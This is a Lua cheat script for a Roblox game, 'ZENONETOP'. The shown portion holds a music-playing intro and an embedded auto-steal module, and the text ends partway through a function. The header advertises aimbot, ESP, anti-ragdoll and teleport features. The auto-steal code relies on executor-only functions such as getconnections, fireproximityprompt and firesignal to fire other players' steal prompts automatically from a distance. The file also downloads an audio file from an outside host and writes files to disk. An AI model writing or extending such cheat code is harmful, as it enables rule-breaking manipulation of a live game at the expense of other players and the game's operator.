--[[
 ZENONETOP — Full Menu
 Tab 1 Player: Anti Gummy/Ragdoll/Paintball/Boogie + Speed 3-mode (Vis S2 loop)
 + Tool Aimbot + Drop Jump/Stand + Insta V1/V2 + TP Down keybinds
 Tab 2 ESP: Player ESP + Tracker + Anti Lag (Vis logic)
 Tab 3 Settings: Mobile 3-mode buttons, Lock/Unlock, shape Box/Round/Square,
 per-button size +/-, Reset Mobile / Reset All
 Close menu: nút − | Open: mini kéo được | NO keybind to open/close
]]

repeat task.wait() until game:IsLoaded()
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TS = game:GetService("TweenService")
local RS = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
if not LP then
	repeat task.wait() until Players.LocalPlayer
	LP = Players.LocalPlayer
end
local PlayerGui = LP:WaitForChild("PlayerGui", 30) or LP:FindFirstChild("PlayerGui") or game:GetService("CoreGui")

pcall(function()
	for _, n in ipairs({
 "ZenonetopHubFullMenu", "ZenonetopHubFullMini", "ZenonetopHubModeBar", "ZenonetopHubActionButtons", "ZenonetopIntro", "ZenonetopHubIntro",
	}) do
 local g = PlayerGui:FindFirstChild(n)
 if g then g:Destroy() end
	end
end)

----------------------------------------------------------------
-- ZENONETOP.CC INTRO (red/black/white, music + skip)
----------------------------------------------------------------
do
	local TweenService = TS
	local SoundService = game:GetService("SoundService")
	--============================================================
	-- INTRO SETTINGS
	--============================================================

	local MUSIC_URL = "https://files.catbox.moe/qhpfe5.mp3"
	local MUSIC_FILE = "ShadowVS_Music.mp3"
	local MUSIC_VOLUME = 0.75
	local BPM = 100
	local BEAT = 60 / BPM
	local BACKGROUND_ID = "rbxassetid://77503307528071"

	--============================================================
	-- INTRO STATE
	--============================================================

	local introActive = true
	local introFinished = false
	local introSound = nil
	local introGui = nil

	--============================================================
	-- SHOW INTRO FIRST
	--============================================================

	local function createIntro()
	    -- Clean old intro
	    for _, name in ipairs({"ZenonetopIntro"}) do
	        local old = PlayerGui:FindFirstChild(name)
	        if old then old:Destroy() end
	    end

	    introGui = Instance.new("ScreenGui")
	    introGui.Name = "ZenonetopIntro"
	    introGui.IgnoreGuiInset = true
	    introGui.ResetOnSpawn = false
	    introGui.DisplayOrder = 999999
	    introGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	    introGui.Parent = PlayerGui

	    -- Background (Black)
	    local background = Instance.new("Frame", introGui)
	    background.Size = UDim2.fromScale(1, 1)
	    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	    background.BorderSizePixel = 0
	    background.ClipsDescendants = true

	    -- Background Image
	    local bgImage = Instance.new("ImageLabel", background)
	    bgImage.AnchorPoint = Vector2.new(0.5, 0.5)
	    bgImage.Position = UDim2.fromScale(0.5, 0.5)
	    bgImage.Size = UDim2.fromScale(1.08, 1.08)
	    bgImage.BackgroundTransparency = 1
	    bgImage.Image = BACKGROUND_ID
	    bgImage.ImageTransparency = 1
	    bgImage.ScaleType = Enum.ScaleType.Crop
	    bgImage.ZIndex = 1

	    -- Dark Overlay
	    local dark = Instance.new("Frame", background)
	    dark.Size = UDim2.fromScale(1, 1)
	    dark.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	    dark.BackgroundTransparency = 0.35
	    dark.BorderSizePixel = 0
	    dark.ZIndex = 2

	    -- Skip Button
	    local skip = Instance.new("TextButton", introGui)
	    skip.AnchorPoint = Vector2.new(1, 0)
	    skip.Position = UDim2.new(1, -14, 0, 14)
	    skip.Size = UDim2.fromOffset(105, 36)
	    skip.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
	    skip.BackgroundTransparency = 0.15
	    skip.BorderSizePixel = 0
	    skip.Text = "SKIP INTRO"
	    skip.TextColor3 = Color3.fromRGB(255, 255, 255)
	    skip.TextSize = 12
	    skip.Font = Enum.Font.GothamBold
	    skip.AutoButtonColor = false
	    skip.ZIndex = 500

	    local skipCorner = Instance.new("UICorner", skip)
	    skipCorner.CornerRadius = UDim.new(0, 7)

	    local skipStroke = Instance.new("UIStroke", skip)
	    skipStroke.Color = Color3.fromRGB(255, 0, 0)
	    skipStroke.Transparency = 0.5
	    skipStroke.Thickness = 1

	    -- Flash (Red)
	    local flash = Instance.new("Frame", introGui)
	    flash.Size = UDim2.fromScale(1, 1)
	    flash.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	    flash.BackgroundTransparency = 1
	    flash.BorderSizePixel = 0
	    flash.ZIndex = 400

	    -- Main Title - "Zenonetop" (RED)
	    local introTitle = Instance.new("TextLabel", background)
	    introTitle.AnchorPoint = Vector2.new(0.5, 0.5)
	    introTitle.Position = UDim2.fromScale(0.5, 0.47)
	    introTitle.Size = UDim2.fromScale(1.1, 0.22)
	    introTitle.BackgroundTransparency = 1
	    introTitle.Text = "Zenonetop"
	    introTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
	    introTitle.TextTransparency = 1
	    introTitle.TextScaled = true
	    introTitle.Font = Enum.Font.GothamBlack
	    introTitle.ZIndex = 20

	    local titleStroke = Instance.new("UIStroke", introTitle)
	    titleStroke.Color = Color3.fromRGB(0, 0, 0)
	    titleStroke.Thickness = 3
	    titleStroke.Transparency = 1

	    -- Subtitle - "cc" (WHITE)
	    local introSubtitle = Instance.new("TextLabel", background)
	    introSubtitle.AnchorPoint = Vector2.new(0.5, 0.5)
	    introSubtitle.Position = UDim2.fromScale(0.5, 0.57)
	    introSubtitle.Size = UDim2.fromScale(0.4, 0.08)
	    introSubtitle.BackgroundTransparency = 1
	    introSubtitle.Text = "cc"
	    introSubtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	    introSubtitle.TextTransparency = 1
	    introSubtitle.TextScaled = true
	    introSubtitle.Font = Enum.Font.GothamBold
	    introSubtitle.ZIndex = 20

	    -- Red Accent Line
	    local accentLine = Instance.new("Frame", background)
	    accentLine.AnchorPoint = Vector2.new(0.5, 0.5)
	    accentLine.Position = UDim2.fromScale(0.5, 0.52)
	    accentLine.Size = UDim2.fromScale(0, 0.003)
	    accentLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	    accentLine.BackgroundTransparency = 1
	    accentLine.BorderSizePixel = 0
	    accentLine.ZIndex = 15

	    -- Music Loader
	    local function loadMusic()
	        local asset
	        pcall(function()
	            if isfile and isfile(MUSIC_FILE) then
	                asset = getcustomasset(MUSIC_FILE)
	            end
	        end)
	        if not asset then
	            local success, data = pcall(function()
	                return game:HttpGet(MUSIC_URL)
	            end)
	            if success and data and #data > 1000 then
	                pcall(function()
	                    writefile(MUSIC_FILE, data)
	                end)
	                pcall(function()
	                    asset = getcustomasset(MUSIC_FILE)
	                end)
	            end
	        end
	        return asset
	    end

	    -- Play Music
	    task.spawn(function()
	        local asset = loadMusic()
	        if not asset or not introActive then return end
	        introSound = Instance.new("Sound")
	        introSound.Name = "ZenonetopIntroMusic"
	        introSound.SoundId = asset
	        introSound.Volume = MUSIC_VOLUME
	        introSound.Looped = false
	        introSound.Parent = SoundService
	        pcall(function() introSound:Play() end)
	    end)

	    -- Finish Intro
	    local function finishIntro()
	        if introFinished then return end
	        introFinished = true
	        introActive = false
        
	        if introSound then
	            pcall(function()
	                TweenService:Create(introSound, TweenInfo.new(0.35), { Volume = 0 }):Play()
	            end)
	            task.delay(0.4, function()
	                pcall(function()
	                    introSound:Stop()
	                    introSound:Destroy()
	                end)
	            end)
	        end
        
	        pcall(function() introGui:Destroy() end)
	    end

	    -- Skip
	    skip.MouseButton1Click:Connect(finishIntro)

	    -- Skip Hover
	    skip.MouseEnter:Connect(function()
	        TweenService:Create(skip, TweenInfo.new(0.12), {
	            BackgroundColor3 = Color3.fromRGB(60, 0, 0)
	        }):Play()
	    end)
	    skip.MouseLeave:Connect(function()
	        TweenService:Create(skip, TweenInfo.new(0.12), {
	            BackgroundColor3 = Color3.fromRGB(20, 0, 0)
	        }):Play()
	    end)

	    -- Background Image Fade In
	    TweenService:Create(bgImage, TweenInfo.new(1.1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
	        ImageTransparency = 0
	    }):Play()

	    -- Slow Zoom
	    TweenService:Create(bgImage, TweenInfo.new(18, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
	        Size = UDim2.fromScale(1.18, 1.18)
	    }):Play()

	    -- Beat Flash (Red)
	    task.spawn(function()
	        while introActive and introGui.Parent do
	            flash.BackgroundTransparency = 0.75
	            TweenService:Create(flash, TweenInfo.new(0.12, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
	                BackgroundTransparency = 1
	            }):Play()
	            task.wait(BEAT)
	        end
	    end)

	    -- Title
	    task.wait(1.5)
	    if not introActive then return end

	    TweenService:Create(introTitle, TweenInfo.new(0.7, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
	        Size = UDim2.fromScale(0.9, 0.18),
	        TextTransparency = 0
	    }):Play()

	    TweenService:Create(titleStroke, TweenInfo.new(0.5), {
	        Transparency = 0
	    }):Play()

	    TweenService:Create(accentLine, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
	        Size = UDim2.fromScale(0.3, 0.003),
	        BackgroundTransparency = 0
	    }):Play()

	    -- Title Shake
	    task.wait(1)
	    for i = 1, 18 do
	        if not introActive then return end
	        introTitle.Position = UDim2.fromScale(
	            0.5 + math.random(-8, 8) / 1000,
	            0.47 + math.random(-8, 8) / 1000
	        )
	        task.wait(0.025)
	    end
	    introTitle.Position = UDim2.fromScale(0.5, 0.47)

	    -- Subtitle
	    TweenService:Create(introSubtitle, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
	        TextTransparency = 0
	    }):Play()

	    -- Hold
	    task.wait(7)
	    if not introActive then return end

	    -- Final Beat Flashes
	    for i = 1, 14 do
	        if not introActive then return end
	        flash.BackgroundTransparency = 0
	        task.wait(0.025)
	        flash.BackgroundTransparency = 1
	        task.wait(0.065)
	    end

	    -- Extra Hold
	    task.wait(2)
	    if not introActive then return end

	    -- Title Fade
	    TweenService:Create(introTitle, TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
	        TextTransparency = 1
	    }):Play()
	    TweenService:Create(introSubtitle, TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
	        TextTransparency = 1
	    }):Play()
	    TweenService:Create(titleStroke, TweenInfo.new(1), {
	        Transparency = 1
	    }):Play()
	    TweenService:Create(accentLine, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
	        BackgroundTransparency = 1
	    }):Play()

	    -- Image Fade
	    TweenService:Create(bgImage, TweenInfo.new(1.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
	        ImageTransparency = 1
	    }):Play()
	    TweenService:Create(dark, TweenInfo.new(1.5), {
	        BackgroundTransparency = 1
	    }):Play()

	    -- Music Fade
	    if introSound and introSound.Parent then
	        TweenService:Create(introSound, TweenInfo.new(1.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
	            Volume = 0
	        }):Play()
	    end

	    -- Final Black Fade
	    local finalFade = Instance.new("Frame", introGui)
	    finalFade.Size = UDim2.fromScale(1, 1)
	    finalFade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	    finalFade.BackgroundTransparency = 1
	    finalFade.BorderSizePixel = 0
	    finalFade.ZIndex = 1000

	    TweenService:Create(finalFade, TweenInfo.new(1.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
	        BackgroundTransparency = 0
	    }):Play()

	    task.wait(1.6)
	    finishIntro()
	end

	--============================================================
	-- START INTRO
	--============================================================

	task.spawn(function()
		pcall(createIntro)
	end)
end


----------------------------------------------------------------
-- COLORS / STATE
----------------------------------------------------------------
local C = {
	-- Empire-style palette
	bg = Color3.fromRGB(12, 12, 16), bg2 = Color3.fromRGB(18, 18, 24),
	card = Color3.fromRGB(24, 24, 32), stroke = Color3.fromRGB(60, 60, 80),
	accent = Color3.fromRGB(255, 20, 147), text = Color3.fromRGB(255, 255, 255),
	textDim = Color3.fromRGB(160, 160, 180), on = Color3.fromRGB(60, 220, 110),
	off = Color3.fromRGB(40, 40, 52), box = Color3.fromRGB(32, 32, 44),
	danger = Color3.fromRGB(220, 70, 90),
	modeOnBg = Color3.fromRGB(255, 20, 147), modeOnTxt = Color3.fromRGB(255, 255, 255),
	modeOffBg = Color3.fromRGB(255, 255, 255), modeOffTxt = Color3.fromRGB(25, 25, 30),
	btnOn = Color3.fromRGB(50, 210, 100), -- xanh khi ON (Empire style)
	btnOff = Color3.fromRGB(16, 16, 22),
}


-- Auto-write Vis Auto Steal for loadstring
pcall(function()
	if writefile then
 writefile("Zenonetop_Auto_Steal_Embedded.lua", [==[--[[
 Auto Steal — full ZENONETOP logic V1 / Semi V1-V2 / V3
]]
if _G.__VisAutoStealRunning then
	pcall(function()
 -- allow re-exec
	end)
end
_G.__VisAutoStealRunning = true

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")

-- Shared state (must match ZENONETOP names used in steal logic)
autoStealEnabled = false
selectedStealMode = "Normal"
autoStealRadius = 60
autoStealV1PausePercent = 75
autoStealV2Version = "V1"
_G.AceStealRadii = _G.AceStealRadii or { Normal = 60, Semi = 9, V3 = 60 }
_G.AceStealBarProgress = 0
_G.PulseAutoRadiusEnabled = false

local function saveAceConfig() end
setAutoStealVisual = nil

-- Minimal StealBar (progress only, no floating bar)
do
	local StealBar = {}
	function StealBar.SetProgress(p)
 _G.AceStealBarProgress = math.clamp(tonumber(p) or 0, 0, 1)
	end
	function StealBar.Reset()
 _G.AceStealBarProgress = 0
	end
	function StealBar.SetState(state)
 if tostring(state) == "SUCCESS" then
 _G.AceStealBarProgress = 1
 end
	end
	_G.StealBar = StealBar
end


-- AUTO STEAL — Normal/V1 = Galaxy Auto Steal V1 (hold → 75% → trigger)
-- ============================================================
-- ============================================================
-- AUTO STEAL — Normal/V1 = Pulse Normal V2 FULL logic
-- (thay Galaxy Auto Steal V1: radius hold + pause 75% + close-range finish)
-- ============================================================
_G.__AceSetupNormalAutoSteal = function()
 _G.AceNormalSteal = _G.AceNormalSteal or {}
 local A = _G.AceNormalSteal
 if A.conn then
 pcall(function()
 A.conn:Disconnect()
 end)
 A.conn = nil
 end
 if A.progressConn then
 pcall(function()
 A.progressConn:Disconnect()
 end)
 A.progressConn = nil
 end
 A.enabled = false
 A.isStealing = false
 A.stealStartTime = 0
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 A.data = A.data or {}
 A.duration = 2.0
 A.radius = tonumber(autoStealRadius) or 62
 local function barSet(p, label)
 pcall(function()
 if _G.StealBar then
 _G.StealBar.SetState(label or "STEALING")
 _G.StealBar.SetProgress(math.clamp(tonumber(p) or 0, 0, 1))
 end
 end)
 end
 local function barReset()
 pcall(function()
 if _G.StealBar then
 _G.StealBar.Reset()
 end
 end)
 end
 local function getDetectedPlayerSpeed()
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 local hum = char and char:FindFirstChildOfClass("Humanoid")
 local speed = 0
 if root then
 local v = root.AssemblyLinearVelocity or root.Velocity
 speed = Vector3.new(v.X, 0, v.Z).Magnitude
 elseif hum then
 speed = hum.WalkSpeed or 0
 end
 if speed >= 40 then
 A.lastSpeed = speed
 end
 return A.lastSpeed or 62
 end
 local function getAutoGrabRadius()
 local r
 if _G.PulseAutoRadiusEnabled == true then
 r = math.clamp(getDetectedPlayerSpeed() + 1, 1, 500)
 else
 r = tonumber(autoStealRadius) or A.radius or 62
 end
 return math.clamp(r, 1, 500)
 end
 local function getAutoGrabPauseFraction()
 -- no pause by default: if _G.ZenonetopStealPause ~= true → treat as close-enough always (100%)
 if _G.ZenonetopStealPause ~= true then
 return 1.0 -- full 0-100 without waiting
 end
 local pct = tonumber(autoStealV1PausePercent) or 75
 pct = math.clamp(pct, 1, 99)
 return pct / 100
 end
 local function isMyPlotByName(plotName)
 local plots = workspace:FindFirstChild("Plots")
 if not plots then
 return false
 end
 local plot = plots:FindFirstChild(plotName)
 if not plot then
 return false
 end
 local sign = plot:FindFirstChild("PlotSign")
 if sign then
 local yb = sign:FindFirstChild("YourBase")
 if yb and yb:IsA("BillboardGui") then
 return yb.Enabled == true
 end
 local frame = sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
 local label = frame and frame:FindFirstChild("TextLabel")
 if label then
 local owner = label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
 if LP.DisplayName and owner == LP.DisplayName then
 return true
 end
 if LP.Name and owner == LP.Name then
 return true
 end
 end
 end
 return false
 end
 local function findNearestPrompt()
 local char = LP.Character
 if not char then
 return nil
 end
 local root = char:FindFirstChild("HumanoidRootPart")
 if not root then
 return nil
 end
 local plots = workspace:FindFirstChild("Plots")
 if not plots then
 return nil
 end
 local activeRadius = getAutoGrabRadius()
 local nearest, dist = nil, math.huge
 for _, plot in ipairs(plots:GetChildren()) do
 if not isMyPlotByName(plot.Name) then
 local pods = plot:FindFirstChild("AnimalPodiums")
 if pods then
 for _, pod in ipairs(pods:GetChildren()) do
 local base = pod:FindFirstChild("Base")
 local sp = base and base:FindFirstChild("Spawn")
 if sp then
 local d = (sp.Position - root.Position).Magnitude
 if d <= activeRadius and d < dist then
 local att = sp:FindFirstChild("PromptAttachment")
 local prompts = {}
 if att then
 for _, prompt in ipairs(att:GetChildren()) do
 if prompt:IsA("ProximityPrompt") then table.insert(prompts, prompt) end
 end
 end
 if sp then
 for _, obj in ipairs(sp:GetDescendants()) do
 if obj:IsA("ProximityPrompt") then table.insert(prompts, obj) end
 end
 end
 for _, prompt in ipairs(prompts) do
 local act = tostring(prompt.ActionText or ""):lower()
 local ok = act:find("steal", 1, true) or act:find("steal", 1, true) or act:find("steal", 1, true)
 or act:find("grab", 1, true) or act:find("take", 1, true) or act == ""
 if ok or prompt.Enabled then
 nearest, dist = prompt, d
 end
 end
 end
 end
 end
 end
 end
 end
 return nearest
 end
 local function executeSteal(prompt)
 if A.isStealing then
 return
 end
 if not prompt then
 return
 end
 if not A.data[prompt] then
 A.data[prompt] = { hold = {}, trigger = {}, ready = true }
 if getconnections then
 local okHold, holds = pcall(getconnections, prompt.PromptButtonHoldBegan)
 if okHold and type(holds) == "table" then
 for _, c in ipairs(holds) do
 if c.Function then
 table.insert(A.data[prompt].hold, c.Function)
 end
 end
 end
 local okTrig, triggers = pcall(getconnections, prompt.Triggered)
 if okTrig and type(triggers) == "table" then
 for _, c in ipairs(triggers) do
 if c.Function then
 table.insert(A.data[prompt].trigger, c.Function)
 end
 end
 end
 end
 end
 local data = A.data[prompt]
 if not data.ready then
 return
 end
 data.ready = false
 A.isStealing = true
 A.stealStartTime = tick()
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 barSet(0, "STEALING")
 local targetPart = prompt:FindFirstAncestorWhichIsA("BasePart")
 local restarting = false
 local pauseFraction = (function()
 if _G.ZenonetopStealPause == true or (St and St.stealPause == true) then
 return math.clamp(((St and St.stealPausePct) or 75) / 100, 0.3, 0.95)
 end
 return 1 -- không pause: full 0→100 liên tục
 end)()
 local finishFraction = 1 - pauseFraction
 local function modeStillActive()
 return A.enabled and (selectedStealMode == "Normal" or selectedStealMode == "V1") and A.isStealing
 end
 local function isTargetInCurrentRadius()
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 local radius = getAutoGrabRadius()
 return root
 and targetPart
 and targetPart.Parent
 and (root.Position - targetPart.Position).Magnitude <= radius
 end
 local function isCloseEnoughToGrab()
 -- Stand gần brainrot / cột (prompt Steal hiện) → cho lên 100%
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 if not root or not targetPart or not targetPart.Parent then
 return false
 end
 local closeRange = 10
 pcall(function()
 if prompt and prompt.Parent then
 local mad = tonumber(prompt.MaxActivationDistance)
 if mad and mad > 0 then
 closeRange = math.max(mad, 8)
 end
 end
 end)
 closeRange = math.clamp(closeRange, 6, 15)
 return (root.Position - targetPart.Position).Magnitude <= closeRange
 end
 local function canStillGrab()
 -- Nới rất rộng khi đang steal — tránh reset sớm 60-80%
 if not prompt or not prompt.Parent then
 return false
 end
 if not targetPart or not targetPart.Parent then
 return prompt.Parent ~= nil
 end
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 if not root then return true end
 local radius = getAutoGrabRadius()
 local extra = math.max(radius * 1.5, 80) -- nới mạnh, không reset giữa chừng
 local d = (root.Position - targetPart.Position).Magnitude
 return d <= (radius + extra)
 end
 local function restartFromZero()
 if restarting then
 return
 end
 restarting = true
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 if A.progressConn then
 A.progressConn:Disconnect()
 A.progressConn = nil
 end
 barReset()
 data.ready = true
 A.isStealing = false
 end
 if A.progressConn then
 A.progressConn:Disconnect()
 end
 A.progressConn = RunService.Heartbeat:Connect(function()
 if not A.isStealing then
 if A.progressConn then
 A.progressConn:Disconnect()
 A.progressConn = nil
 end
 return
 end
 if not A.enabled or (selectedStealMode ~= "Normal" and selectedStealMode ~= "V1") then
 restartFromZero()
 return
 end
 -- Chỉ abort nếu prompt biến mất; giữ bar + steal khi còn hold brainrot
 if not prompt or not prompt.Parent then
 restartFromZero()
 return
 end
 if not canStillGrab() then
 -- quá xa thật sự mới pause, không reset về 0 ngay
 if not A.paused then
 A.paused = true
 A.pauseStarted = tick()
 end
 elseif A.paused then
 A.pausedDuration = (A.pausedDuration or 0) + (tick() - (A.pauseStarted or tick()))
 A.paused = false
 A.pauseStarted = nil
 end
 local pf = getAutoGrabPauseFraction()
 if A.paused then
 barSet(pf, "STEALING")
 return
 end
 local elapsed = tick() - A.stealStartTime - (A.pausedDuration or 0)
 barSet(math.clamp(elapsed / (A.duration or 2.0), 0, pf), "STEALING")
 end)
 task.spawn(function()
 -- Fire hold callbacks
 for _, fn in ipairs(data.hold) do
 task.spawn(function() pcall(fn) end)
 end
 -- Luôn thử native hold + fireproximityprompt (V1 fix khi getconnections rỗng)
 pcall(function()
 if prompt.InputHoldBegin then prompt:InputHoldBegin() end
 end)
 if fireproximityprompt then
 pcall(function()
 fireproximityprompt(prompt)
 end)
 pcall(function()
 fireproximityprompt(prompt, 1)
 end)
 end
 if #data.hold == 0 and #data.trigger == 0 then
 pcall(function()
 if fireproximityprompt then
 fireproximityprompt(prompt, A.duration or 1.3)
 end
 end)
 end
 local dur = tonumber(A.duration) or 2.0
 local holdStart = tick()
 local wasAbleToGrab = false

 -- Đã đứng sẵn ở cột (≤2 stud): steal NORMAL full 0 → 100%
 if isCloseEnoughToGrab() or (not (_G.ZenonetopStealPause == true or (St and St.stealPause == true))) then
 -- No pause / đang sát cột: full 0→100, chỉ hủy nếu prompt mất / quá xa
 while tick() - holdStart < dur do
 if not modeStillActive() or not canStillGrab() then
 restartFromZero()
 return
 end
 local p = math.clamp((tick() - holdStart) / dur, 0, 1)
 barSet(p, "STEALING")
 if p >= 0.999 then break end
 task.wait()
 end
 barSet(1, "STEALING")
 wasAbleToGrab = true
 else
 -- Ngoài cột: chỉ lên 75% rồi giữ
 while tick() - holdStart < dur * pauseFraction do
 if not modeStillActive() or not canStillGrab() then
 restartFromZero()
 return
 end
 -- Trong lúc tụ 75%, nếu bước vào cột → chuyển normal lên 100%
 if isCloseEnoughToGrab() then
 local cur = math.clamp((tick() - holdStart) / dur, 0, pauseFraction)
 local remainStart = tick()
 local remainDur = dur * (1 - cur)
 while tick() - remainStart < remainDur do
 if not modeStillActive() or not canStillGrab() or not isCloseEnoughToGrab() then
 restartFromZero()
 return
 end
 local p = cur + (1 - cur) * math.clamp((tick() - remainStart) / remainDur, 0, 1)
 barSet(p, "STEALING")
 task.wait()
 end
 barSet(1, "STEALING")
 wasAbleToGrab = true
 break
 end
 local p = math.clamp((tick() - holdStart) / dur, 0, pauseFraction)
 barSet(p, "STEALING")
 task.wait()
 end

 if not wasAbleToGrab then
 barSet(pauseFraction, "STEALING") -- ngoài cột: đứng 75%
 A.paused = true
 A.pauseStarted = tick()
 -- Wait lại gần cột/brainrot → tăng 75% → 100% như normal
 while modeStillActive() do
 if not canStillGrab() then
 restartFromZero()
 return
 end
 if isCloseEnoughToGrab() then
 wasAbleToGrab = true
 break
 end
 task.wait()
 end
 if not modeStillActive() or not canStillGrab() then
 restartFromZero()
 return
 end
 if wasAbleToGrab then
 A.pausedDuration = (A.pausedDuration or 0) + (tick() - (A.pauseStarted or tick()))
 A.paused = false
 A.pauseStarted = nil
 local finishStart = tick()
 local finishDur = dur * (1 - pauseFraction)
 while tick() - finishStart < finishDur do
 if not modeStillActive() or not canStillGrab() or not isCloseEnoughToGrab() then
 restartFromZero()
 return
 end
 local fp = pauseFraction + (1 - pauseFraction) * math.clamp((tick() - finishStart) / finishDur, 0, 1)
 barSet(fp, "STEALING")
 task.wait()
 end
 barSet(1, "STEALING")
 end
 end
 end

 if wasAbleToGrab then
 -- bar 100% + fire steal thật
 A.paused = false
 A.pauseStarted = nil
 barSet(1, "STEALING")
 for _, fn in ipairs(data.trigger) do
 task.spawn(fn)
 end
 if fireproximityprompt then
 pcall(function() fireproximityprompt(prompt, A.duration or 1.3) end)
 pcall(function() fireproximityprompt(prompt, 1) end)
 pcall(function() fireproximityprompt(prompt) end)
 end
 pcall(function()
 if firesignal then
 pcall(firesignal, prompt.Triggered)
 end
 end)
 pcall(function()
 if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
 _G.AutoCarrySpeed.WatchPickup(1.25)
 end
 end)
 if A.progressConn then
 A.progressConn:Disconnect()
 A.progressConn = nil
 end
 barSet(1, "SUCCESS")
 -- 100% → 0 NGAY lập tức
 _G.AceStealBarProgress = 0
 barReset()
 if _G.StealBar and _G.StealBar.Reset then pcall(_G.StealBar.Reset) end
 data.ready = true
 A.isStealing = false
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 -- micro-yield rồi Heartbeat sẽ pick target lại ngay
 task.defer(function()
 if not A.enabled then return end
 if A.isStealing then return end
 local t2 = findNearestPrompt and findNearestPrompt()
 if t2 then
 pcall(executeSteal, t2)
 end
 end)
 else
 -- No pause: vẫn reset 0 ngay để đầy lại
 barReset()
 data.ready = true
 A.isStealing = false
 restartFromZero()
 end
 end)
 end
 _G.AceNormalAutoStealSetRadius = function(v)
 local n = tonumber(v)
 if n then
 A.radius = n
 end
 end
 _G.AceNormalAutoStealStop = function()
 A.enabled = false
 A.isStealing = false
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 if A.conn then
 A.conn:Disconnect()
 A.conn = nil
 end
 if A.progressConn then
 A.progressConn:Disconnect()
 A.progressConn = nil
 end
 barReset()
 end
 _G.AceNormalAutoStealStart = function()
 A.radius = tonumber(autoStealRadius) or A.radius or 62
 A.duration = 1.3
 A.enabled = true
 if A.conn then
 A.conn:Disconnect()
 A.conn = nil
 end
 A.conn = RunService.Heartbeat:Connect(function()
 if not A.enabled then
 return
 end
 if (selectedStealMode ~= "Normal" and selectedStealMode ~= "V1") then
 _G.AceNormalAutoStealStop()
 return
 end
 if A.isStealing then
 return
 end
 local target = findNearestPrompt()
 if target then
 executeSteal(target)
 end
 end)
 end
 _G.AceNormalAutoStealSync = function()
 if (selectedStealMode == "Normal" or selectedStealMode == "V1") and autoStealEnabled then
 _G.AceNormalAutoStealStart()
 else
 _G.AceNormalAutoStealStop()
 end
 end
end
_G.__AceSetupNormalAutoSteal()

_G.__AceSetupSemiAutoSteal = function()
	_G.AceSemiSteal = _G.AceSemiSteal or {}
	local A = _G.AceSemiSteal
	if A.conn then pcall(function() A.conn:Disconnect() end); A.conn = nil end
	A.enabled = false
	A.holdMin = 1.3
	A.holdMax = 2.6
	A.entryDelay = 0.05
	A.cooldown = 0
	A.primeRange = 100
	A.radius = math.clamp(tonumber(autoStealRadius) or 10, 1, 100)
	A.conn = A.conn
	A.scanThread = A.scanThread
	A.plotSync = A.plotSync or {caches = {}, connections = {}}
	A.animals = A.animals or {}
	A.promptCache = A.promptCache or {}
	A.internalCache = A.internalCache or {}
	A.state = A.state or {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0}
	local function barSet(p, label)
 pcall(function()
 if _G.StealBar then
 _G.StealBar.SetState(label or "STEALING")
 _G.StealBar.SetProgress(math.clamp(tonumber(p) or 0, 0, 1))
 end
 end)
	end
	local function barReset()
 pcall(function()
 if _G.StealBar then _G.StealBar.Reset() end
 end)
	end
	local function rootPart()
 local char = LP.Character
 return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")) or nil
	end
	local function splitPath(path)
 if typeof(path) == "table" then return path end
 local out = {}
 for part in string.gmatch(tostring(path), "[^%.]+") do
 table.insert(out, tonumber(part) or part)
 end
 return out
	end
	local function resolvePath(path, root)
 local current, parent, key = root, nil, nil
 for _, part in ipairs(splitPath(path)) do
 parent = current
 key = part
 current = current and current[part] or nil
 end
 return current, parent, key
	end
	local function applySyncDiff(channelName, packet)
 local cache = A.plotSync.caches[channelName]
 if typeof(cache) ~= "table" then return end
 local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
 local current, parent, key = resolvePath(path, cache)
 if action == "Changed" then
 if parent ~= nil then parent[key] = a end
 elseif action == "ArrayInsert" then
 if current ~= nil then table.insert(current, b, a) end
 elseif action == "ArrayRemoved" then
 if current ~= nil then table.remove(current, b) end
